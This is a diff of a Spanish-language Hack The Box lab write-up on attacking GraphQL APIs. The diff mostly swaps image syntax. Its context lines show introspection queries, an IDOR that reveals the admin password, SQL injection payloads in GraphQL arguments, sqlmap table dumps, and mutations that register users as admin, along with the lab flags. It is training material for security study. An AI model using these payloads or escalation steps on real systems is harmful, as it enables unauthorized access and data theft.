@@ -18,7 +18,9 @@ Este comando ha iniciado la herramienta [graphw00f](https://github.com/dolevf/gr
 python3 main.py -d -f -t http://154.57.164.66:41523/
 ```
 
-![[Attacking GraphQL Practise graphql.png]]
+<p align="center"> 
+<img src="images/Attacking GraphQL Practise graphql.png" width="600" alt="Resultado de Nmap">
+</p>
 
 Podemos identificar todos los tipos de GraphQL usando este comando:
 
@@ -32,7 +34,9 @@ Podemos identificar todos los tipos de GraphQL usando este comando:
 }
 ```
 
-![[Attacking GraphQL Practise grapfo.png]]
+<p align="center"> 
+<img src="images/Attacking GraphQL Practise grapfo.png" width="600" alt="Resultado de Nmap">
+</p>
 
 Y sí, obtenemos tipos personalizados interesantes, **SecretObject**  
   
@@ -53,7 +57,9 @@ Ahora podemos obtener todos los nombres del campo del tipo usando este comando:
 }
 ```
 
-![[Attacking GraphQL Practise secret.png]]
+<p align="center"> 
+<img src="images/Attacking GraphQL Practise secret.png" width="600" alt="Resultado de Nmap">
+</p>
 
 ```
 {
@@ -69,7 +75,9 @@ Ahora podemos obtener todos los nombres del campo del tipo usando este comando:
 
 En GraphQL, la raíz de todas las consultas se llama normalmente `Query`. Puedes ejecutar esta consulta de introspección para ver qué campos principales acepta el servidor. El servidor te devolverá una lista con todas las operaciones de lectura permitidas. Entre los resultados que te devuelva la API aparecerán nombres como `users`, `posts`, o en este caso particular, **`secrets`**.
 
-![[graphiQL.png]]
+<p align="center"> 
+<img src="images/graphiQL.png" width="600" alt="Resultado de Nmap">
+</p>
 
 Podemos ver que tenemos un campo interesante, como secreto, intentemos descubrir los detalles de este campo.
 
@@ -82,9 +90,12 @@ Podemos ver que tenemos un campo interesante, como secreto, intentemos descubrir
 }
 ```
 
-![[Attacking GraphQL Practise htb grapghl.png]]
+<p align="center"> 
+<img src="images/Attacking GraphQL Practise htb grapghl.png" width="600" alt="Resultado de Nmap">
+</p>
 
 anwers: **HTB{ddd7c7354d1f06db3604b3bbc8ccf5cd}**
+
 ### Insecure Direct Object Reference (IDOR)
 
 1. **After following the steps in the section, what is the flag you can find in the admins password?**
@@ -93,7 +104,9 @@ Authenticate to 154.57.164.66 , with user "<font color="#00b050">htb-stdnt</font
 
 Una vez que que nos autentificamos en la pagina. en un post nos enteramos el nombre del administrador que es **admin**
 
-![[Attacking GraphQL Practise read.png]]
+<p align="center"> 
+<img src="images/Attacking GraphQL Practise read.png" width="600" alt="Resultado de Nmap">
+</p>
 
 Una vez autenticados en la plataforma, descubrimos mediante publicaciones internas la existencia de un usuario administrador (`admin`). Utilizando introspección sobre el esquema, consultamos la estructura del tipo **`UserObject`** para conocer sus campos disponibles:
 
@@ -114,7 +127,9 @@ Una vez autenticados en la plataforma, descubrimos mediante publicaciones intern
 
 La respuesta de la API nos confirma que `UserObject` contiene campos sensibles, entre los cuales destacan `uuid`, `id`, `username`, `password`, `role`, `msg` ..
 
-![[Attacking GraphQL Practise usrname password.png]]
+<p align="center"> 
+<img src="images/Attacking GraphQL Practise usrname password.png" width="600" alt="Resultado de Nmap">
+</p>
 
 Sabiendo que el objeto usuario maneja el campo `password` y que el nombre de usuario administrador es `admin`, construimos una consulta dirigida para extraer su información de acceso:
 
@@ -129,9 +144,12 @@ Sabiendo que el objeto usuario maneja el campo `password` y que el nombre de usu
 
 La API procesa la consulta y expone en texto plano la contraseña del administrador, la cual contiene la flag del reto:
 
-![[Attacking GraphQL Practise pass admin.png]]
+<p align="center"> 
+<img src="images/Attacking GraphQL Practise pass admin.png" width="600" alt="Resultado de Nmap">
+</p>
 
 answer: **HTB{79ebbbce53f40edf75c667ef6fd36fae}**
+
 ### Injection Attacks
 
 1. **Exploit the SQL injection vulnerability to exfiltrate data from the database. What is the flag you find?**
@@ -153,7 +171,9 @@ El servidor web tiene una API de GraphQL que recibe consultas de usuarios, por e
 
 Ese error es la "prueba de oro": que me confirma 100% que hay una **Inyección SQL (SQLi)**. Alguien malintencionado puede manipular la base de datos escribiendo comandos SQL dentro de ese parámetro.
 
-![[Attacking GraphQL Practise errorradsad.png]]
+<p align="center"> 
+<img src="images/Attacking GraphQL Practise errorradsad.png" width="600" alt="Resultado de Nmap">
+</p>
 
 A continuación esta misma query usada en **GraphiQL** se transformará para el request usado en burpsuite, para obtener esta consulta con que capturemos culaquier post, es más que suficiente. 
 
@@ -161,11 +181,15 @@ A continuación esta misma query usada en **GraphiQL** se transformará para el 
 {"query":"{user(username: \"admin'\") {username password}}"}
 ```
 
-![[Attacking GraphQL Practise burpsuite error pmyasdanakosdjk.png]]
+<p align="center"> 
+<img src="images/Attacking GraphQL Practise burpsuite error pmyasdanakosdjk.png" width="600" alt="Resultado de Nmap">
+</p>
 
 En el request se cliquea en el bóton derecho del ratón y luego seleccionamos **Save selected text to file**. Se guardará el archivo como **req.txt**
 
-![[Attacking GraphQL Practise save asdojkask.png]]
+<p align="center"> 
+<img src="images/Attacking GraphQL Practise save asdojkask.png" width="600" alt="Resultado de Nmap">
+</p>
 
 A continuación se usará la herramienta automatizada **SQLmap**. Identifica con éxito la vulnerabilidad y toma huellas dactilares de la base de datos:
 
@@ -173,7 +197,9 @@ A continuación se usará la herramienta automatizada **SQLmap**. Identifica con
 sqlmap -r req.txt --banner --current-user --current-db --is-dba --batch
 ```
 
-![[Attacking GraphQL Practise sqlmap asdjkasdas.png]]
+<p align="center"> 
+<img src="images/Attacking GraphQL Practise sqlmap asdjkasdas.png" width="600" alt="Resultado de Nmap">
+</p>
 
 Se procederá a enumerar todas las tablas dentro de la base de datos db:
 
@@ -181,7 +207,9 @@ Se procederá a enumerar todas las tablas dentro de la base de datos db:
 sqlmap -r req.txt --tables -D db --batch
 ```
 
-![[Attacking GraphQL Practise sqlmap flagasdjasas.png]]
+<p align="center"> 
+<img src="images/Attacking GraphQL Practise sqlmap flagasdjasas.png" width="600" alt="Resultado de Nmap">
+</p>
 
 Finalmente, volcamos el contenido de la tabla de banderas:
 
@@ -189,9 +217,12 @@ Finalmente, volcamos el contenido de la tabla de banderas:
 sqlmap -r req.txt -D db -T flag --dump --batch
 ```
 
-![[Attacking GraphQL Practise flag asdasd sqlmap.png]]
+<p align="center"> 
+<img src="images/Attacking GraphQL Practise flag asdasd sqlmap.png" width="600" alt="Resultado de Nmap">
+</p>
 
 answer: **HTB{1105f1d9480ac244a0c8f2bc47594581}**
+
 ### Mutations
 
 1. **What is the flag you find in the admin dashboard?**
@@ -255,7 +286,9 @@ fragment TypeRef on __Type {
 
 La respuesta revela una mutación denominada RegisterUser, que parece permitir la creación de nuevas cuentas de usuario. Esta mutación requiere un objeto RegisterUserInput como entrada:
 
-![[Attacking GraphQL Practise response sqlasdoasdas.png]]
+<p align="center"> 
+<img src="images/Attacking GraphQL Practise response sqlasdoasdas.png" width="600" alt="Resultado de Nmap">
+</p>
 
 Para comprender qué campos se pueden proporcionar al registrar un usuario, enumeramos el objeto **RegisterUserInput**:
 
@@ -274,7 +307,10 @@ Para comprender qué campos se pueden proporcionar al registrar un usuario, enum
 
 La respuesta muestra que el objeto RegisterUserInput contiene los siguientes campos:
 
-![[Attacking GraphQL Practise reguistro grapgiasdasdklad.png]]
+<p align="center"> 
+<img src="images/Attacking GraphQL Practise reguistro grapgiasdasdklad.png" width="600" alt="Resultado de Nmap">
+</p>
+
 
   Esto indica que el cliente puede controlar directamente la función del usuario, lo que puede provocar una escalada de privilegios.  
   
@@ -293,7 +329,9 @@ Antes de crear un nuevo usuario, consultamos a los usuarios existentes para comp
 
 The response shows that user passwords are stored as **MD5 hashes**:
 
-![[Attacking GraphQL Practise usdersdadasdas.png]]
+<p align="center"> 
+<img src="images/Attacking GraphQL Practise usdersdadasdas.png" width="600" alt="Resultado de Nmap">
+</p>
 
 Generamos un hash MD5 para la contraseña de la contraseña:
 
@@ -324,7 +362,9 @@ mutation {
 
 La respuesta confirma la creación exitosa del usuario:
 
-![[Attacking GraphQL Practise user gasdasdkfcdañsd asedasd.png]]
+<p align="center"> 
+<img src="images/Attacking GraphQL Practise user gasdasdkfcdañsd asedasd.png" width="600" alt="Resultado de Nmap">
+</p>
 
 La autenticación con la cuenta recién creada se realizó correctamente.  
   
@@ -345,13 +385,18 @@ mutation {
 
 La respuesta confirma que el usuario se crea con el rol de administrador:
 
-![[Attacking GraphQL Practise superusaurioasdad.png]]
+<p align="center"> 
+<img src="images/Attacking GraphQL Practise superusaurioasdad.png" width="600" alt="Resultado de Nmap">
+</p>
 
 Después de autenticarnos como usuario administrativo recién creado, obtenemos acceso al Área de administración y recuperamos exitosamente la bandera:
 
-![[Attacking GraphQL Practise flag superusuaierro0asda.png]]
+<p align="center"> 
+<img src="images/Attacking GraphQL Practise flag superusuaierro0asda.png" width="600" alt="Resultado de Nmap">
+</p>
 
 answer: **HTB{f7082828b5e5ad40d955846ba415d17f}**
+
 ## Skills Assesment
 
 ### Skills Assesment
@@ -362,7 +407,9 @@ answer: **HTB{f7082828b5e5ad40d955846ba415d17f}**
 python3 main.py -d -f -t http://154.57.164.74:43993/
 ```
 
-![[Attacking GraphQL Practise graphql adsad.png]]
+<p align="center"> 
+<img src="images/Attacking GraphQL Practise graphql adsad.png" width="600" alt="Resultado de Nmap">
+</p>
 
   Utilizando la introspección GraphQL, enumeramos todas las mutaciones disponibles expuestas por la API:
 
@@ -425,7 +472,9 @@ La API expone tres mutaciones:
 - `addProduct`
 - `addCustomer`
 
-![[Attacking GraphQL Practise graphiQL asdjkodasjkldas.png]]
+<p align="center"> 
+<img src="images/Attacking GraphQL Practise graphiQL asdjkodasjkldas.png" width="600" alt="Resultado de Nmap">
+</p>
 
 La mutación addEmployee es de particular interés, ya que puede permitir una escalada de privilegios. Esta mutación requiere un objeto AddEmployeeInput. Para determinar qué campos se pueden proporcionar, enumeramos la definición del objeto de entrada:
 
@@ -448,7 +497,9 @@ El objeto AddEmployeeInput contiene los siguientes campos:
 - `employeeId`
 - `role`
 
-![[Attacking GraphQL Practise addemployeeinputasddasdas.png]]
+<p align="center"> 
+<img src="images/Attacking GraphQL Practise addemployeeinputasddasdas.png" width="600" alt="Resultado de Nmap">
+</p>
 
 La presencia de un campo de rol controlable por el usuario sugiere claramente una vulnerabilidad de escalada de privilegios, ya que no se aplican restricciones a nivel de esquema.  
   
@@ -465,7 +516,9 @@ Antes de explotar esto, consultamos a los empleados existentes para comprender c
 }
 ```
 
-![[Attacking GraphQL Practise employeesssasda.png]]
+<p align="center"> 
+<img src="images/Attacking GraphQL Practise employeesssasda.png" width="600" alt="Resultado de Nmap">
+</p>
 
 El campo de identificación parece estar codificado en Base64. Sin embargo, este valor se genera en el servidor y no es necesario proporcionarlo al crear un nuevo empleado.  
   
@@ -484,7 +537,9 @@ mutation {
 }
 ```
 
-![[Attacking GraphQL Practise mutation addemployee.png]]
+<p align="center"> 
+<img src="images/Attacking GraphQL Practise mutation addemployee.png" width="600" alt="Resultado de Nmap">
+</p>
 
 A continuación, intentamos asignar una función elevada estableciendo la función en administrador:
 
@@ -503,7 +558,9 @@ mutation {
 
 Esto confirma una vulnerabilidad de escalada de privilegios no autenticada. Sin embargo, dado que la parte de la aplicación orientada al usuario está deshabilitada, no es posible iniciar sesión como este usuario.  
 
-![[Attacking GraphQL Practise administradfortasda asdiudjada.png]]
+<p align="center"> 
+<img src="images/Attacking GraphQL Practise administradfortasda asdiudjada.png" width="600" alt="Resultado de Nmap">
+</p>
 
 Por lo tanto, continuamos investigando la API en busca de vulnerabilidades de inyección SQL.
 
@@ -511,7 +568,9 @@ Por lo tanto, continuamos investigando la API en busca de vulnerabilidades de in
 
 A la derecha en la pestaña donde dice **Docs** se abre y luego se selecciona **Query**. Dentro de la query esta la diferente forma de como se construye una consulta:
 
-![[Attacking GraphQL Practise queryyysssss.png]]
+<p align="center"> 
+<img src="images/Attacking GraphQL Practise queryyysssss.png" width="600" alt="Resultado de Nmap">
+</p>
 
 Se pruebas todas y donde se consiguió un **SQLi** son los parámetros **apiKey** y **lastName**
 
@@ -527,11 +586,15 @@ Se enumera las claves API válidas mediante la siguiente consulta:
 }
 ```
 
-![[Attacking GraphQL Practise aopikeysadsdas.png]]
+<p align="center"> 
+<img src="images/Attacking GraphQL Practise aopikeysadsdas.png" width="600" alt="Resultado de Nmap">
+</p>
 
 En primer lugar se enumera a los clientes que utilizan una clave API de administración válida:
 
-![[Attacking GraphQL Practise apikeyasdas.png]]
+<p align="center"> 
+<img src="images/Attacking GraphQL Practise apikeyasdas.png" width="600" alt="Resultado de Nmap">
+</p>
 
 Luego intentamos la inyección SQL a través del parámetro lastName:
 
@@ -549,11 +612,15 @@ customerByName(apiKey: "0711a879ed751e63330a78a4b195bbad", lastName: "Sawyer'") 
 
 Esto da como resultado un error de base de datos:
 
-![[Attacking GraphQL Practise error sqlisadasdad.png]]
+<p align="center"> 
+<img src="images/Attacking GraphQL Practise error sqlisadasdad.png" width="600" alt="Resultado de Nmap">
+</p>
 
 Se captura esta misma petición con **burpsuite**. Se debe colocar el asterisco (`*`) justo donde probaste la inyección manual (después de la comilla en `Sawyer'`).
 
-![[Attacking GraphQL Practise burpsuite adjaskdja asterisco.png]]
+<p align="center"> 
+<img src="images/Attacking GraphQL Practise burpsuite adjaskdja asterisco.png" width="600" alt="Resultado de Nmap">
+</p>
 
 Debería de quedar así la consulta: 
 
@@ -578,7 +645,9 @@ Usando la solicitud capturada, enumeramos la base de datos backend:
 sqlmap -r req1.text --dbms=mysql --banner --current-user --current-db --is-dba --batch
 ```
 
-![[Attacking GraphQL Practise sqlmap asdada.png]]
+<p align="center"> 
+<img src="images/Attacking GraphQL Practise sqlmap asdada.png" width="600" alt="Resultado de Nmap">
+</p>
 
 Se enumera todas las tablas:
 
@@ -586,7 +655,9 @@ Se enumera todas las tablas:
 sqlmap -r req1.text --tables -D db --batch
 ```
 
-![[Attacking GraphQL Practise flag asdas.png]]
+<p align="center"> 
+<img src="images/Attacking GraphQL Practise flag asdas.png" width="600" alt="Resultado de Nmap">
+</p>
 
 La bandera se recupera con éxito:
 
@@ -594,6 +665,8 @@ La bandera se recupera con éxito:
 sqlmap -r req1.text -D db -T flag --dump --batch
 ```
 
-![[Attacking GraphQL Practise qlmap flag asdad.png]]
+<p align="center"> 
+<img src="images/Attacking GraphQL Practise qlmap flag asdad.png" width="600" alt="Resultado de Nmap">
+</p>
 
 answer: **HTB{f1d663c11e6db634e1c9403d0e8e3a35}**
